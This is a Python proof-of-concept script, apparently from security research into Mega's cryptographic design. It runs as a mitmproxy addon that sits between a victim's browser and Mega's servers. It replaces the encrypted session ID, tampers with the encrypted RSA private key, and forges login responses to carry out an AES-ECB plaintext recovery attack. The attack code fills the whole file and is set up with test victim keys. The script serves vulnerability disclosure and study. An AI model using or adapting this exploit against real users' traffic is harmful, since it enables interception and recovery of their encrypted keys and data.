
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the AES-ECB plaintext recovery attack on Mega in a MITM setting.
# This script should be passed as argument to mitmproxy, which then intercepts
# traffic between the victim's browser and Mega, and patches the requests to
# perform the binary search attack.
#

import json
import time
import sys

from mitmproxy import http
from secrets import token_bytes
from os.path import dirname

# This file is executed directly, which means imports are relative to this
# folder and not the root of this project. Thus, we meddle with the sys.path.
sys.path.append(dirname(dirname(__file__)))

from issue_02.aes_ecb_pt_recovery_attack import MegaAesEcbPlaintextRecoveryAttack
from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from shared.constants.victim import *
from shared.constants.mitmproxy import *

n, e = decode_urlb64_rsa_pubk(VICTIM_PUBK_URL_B64)

## Quick sanity checks
assert n == VICTIM_RSA_P * VICTIM_RSA_Q
assert VICTIM_RSA_D == pow(e, -1, (VICTIM_RSA_P - 1) * (VICTIM_RSA_Q - 1))
assert VICTIM_RSA_U == pow(VICTIM_RSA_Q, -1, VICTIM_RSA_P)

pk = (n, e)
sk = (VICTIM_RSA_Q, VICTIM_RSA_P, VICTIM_RSA_D, VICTIM_RSA_U)

# Generate target ciphertext-plaintext pair and verify whether the attack can
# recover it
pt_expected = token_bytes(2 * AES_BLOCK_BYTE_SIZE)
ct = aes_encrypt(pt_expected, url_decode(VICTIM_KM_URL_B64))

def log_line(l):
    with open(MITMPROXY_LOG_FILE, "a") as log_fp:
        log_fp.write(f"{l}\n")

with open(MITMPROXY_LOG_FILE, "a+") as log_fp:
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    # Don't change this format, the PoC relies on this start header to
    # detect new runs
    log_fp.write(f"Attack start")
    log_fp.write(f"\n-------- start AES-ECB plaintext recovery attack {now} ----------\n")
    log_fp.write(f"Target user's public key:\n\t- n: {hex(n)}\n\t- e: {hex(e)}\n")
    log_fp.write(f"Target user's private key:" +
        f"\n\t- q: {hex(VICTIM_RSA_Q)}\n\t- p: {hex(VICTIM_RSA_P)}" +
        f"\n\t- d: {hex(VICTIM_RSA_D)}\n\t- u: {hex(VICTIM_RSA_U)}\n")
    log_fp.write(f"Target ciphertext:" +
        f"\n\t- ct: {ct.hex()}\n\t- expected pt: {pt_expected.hex()}\n")

attack = MegaAesEcbPlaintextRecoveryAttack(pk, sk, do_ct_len_encode=True)

def request(flow: http.HTTPFlow) -> None:
    global attack
    if flow.request.method == "POST" and "sid" in flow.request.query:
        sid = url_decode(flow.request.query["sid"])
        pt = attack.recover_pt(sid)
        if pt == pt_expected:
            # Do not change the format of the following line, it is used to
            # detect when the mitmproxy finished it's attack
            log_line(f"Attack done")
            log_line(f"Recovered plaintext: {pt.hex()}")
        else:
            log_line(f"Attack failed.")

        # immitate server and return a login session invalid response
        flow.response = http.Response.make(
            200,
            b"-15",
            {
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                "Access-Control-Expose-Headers": "Original-Content-Length",
                "Access-Control-Max-Age": "86400",
                "Connection": "keep-alive"
            }
        )

def response(flow: http.HTTPFlow) -> None:
    global attack
    if flow.response.headers.get(b"Content-Type") == "application/json":
        d = json.loads(flow.response.text)

        if type(d) == list and hasattr(d[0], "__iter__") and "csid" in d[0]:
            #
            # Replace encrypted session ID
            #
            csid = url_decode(d[0]["csid"])
            #log_line(f"Intercepted csid: {csid.hex()}")
            csid_p = attack.get_special_sid()
            csid_p_encoded = url_encode(csid_p).decode()
            d[0]["csid"] = csid_p_encoded

            #
            # Garble u = q^-1 mod p from the encrypted private key
            #
            csk = url_decode(d[0]["privk"])
            #log_line(f"Intercepted private key csk: {csk.hex()}")
            csk_p = attack.get_bogus_csk(csk, ct)
            #log_line(f"Modified private key csk: {csk_p.hex()}")
            csk_p_enc = url_encode(csk_p)
            d[0]["privk"] = csk_p_enc.decode()

            #
            # Modify response
            #
            flow.response.text = json.dumps(d)
